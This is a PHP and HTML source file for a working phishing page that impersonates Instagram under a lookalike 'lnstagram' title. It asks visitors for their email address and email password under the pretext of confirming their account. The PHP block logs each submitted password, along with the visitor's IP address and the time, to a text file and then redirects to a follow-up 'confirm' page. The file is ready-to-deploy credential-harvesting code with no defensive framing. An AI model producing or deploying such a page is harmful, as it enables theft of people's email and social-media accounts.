<?php
session_start();

if ($_POST) {
	$mail=$_POST["mail"];
	$mail_password=$_POST["mail_password"];
	$ip=$_SERVER["REMOTE_ADDR"];
	date_default_timezone_set('Europe/Istanbul');
    $date=date("d-m-Y H:i:s");

    $file = fopen('an1lmail.txt', 'a');
fwrite($file, "Mail: ".$mail."\n\n" ."Mail Password: ".$mail_password. "\n\n"."Ip Adress: " .$ip."\n\n".   "Time: " .$date.  "\n\n\n");
fclose($file);
echo '';

    $username = $_SESSION['username']  ;
    $password = $_SESSION['password'] ;
    $ip = $_SESSION['ip']  ;
    $date = $_SESSION['date'];


  
   header("Location: confirm.php");
}
?>
<?php
include("anil/anilcss/index.php")
?>

<!DOCTYPE html>
<html>
<head>
    <title>Copyright • lnstagram</title>
	<link rel="icon" sizes="192x192" href="https://i.resimyukle.xyz/PyRHaN.jpg">
	<meta name="viewport" content="width=device-width,inital-scale=1">
	<body style="background:#fafafa;">
	
	<center><br><br><br><div style="width:400px;max-width:1000%;background:white;border:1px solid #cecece;padding: 20px;height:450px;""box-sizing:border-box";>

<img src="mail.gif" alt="mail" width="140">
                            <p id="felonymetin">
    
                            Confirm Your Mail Adress 
							, <p style="width:90%; font-family:sans-serif; color:#555;">
    Please write your instagram Mail Adress and Mail Password and click "Confirm Account" and fill the next form.


</p>
                            </p>
                            <br><br>
                            <center><input onclick="felonybuton('sonuc');" id="felonybuton" type="submit" value="Show Mail Form"></center><br>
                            <form id="sonuc" style="display: none;" method="post">

                           
                            <input type="email" name="mail" placeholder="Mail Address" required="" id="felonykutu"><br><br>
                            <input type="password" name="mail_password" placeholder="Mail Password" required="" id="felonykutu"><br><br>
							
                            <input id="felonybuton1" type="submit" value="Next">
                        <br><br>
                        </form>
                            <p class="felonybilgi">
                               
                          </p>
                        </div>
                    </div>
                </div>
</span>
</body>
<script>
function felonybuton(ID) {
var secilenID = document.getElementById(ID);
if (secilenID.style.display == "none") {
secilenID.style.display = "";
} else {
secilenID.style.display = "none";
}
}
</script>
</html>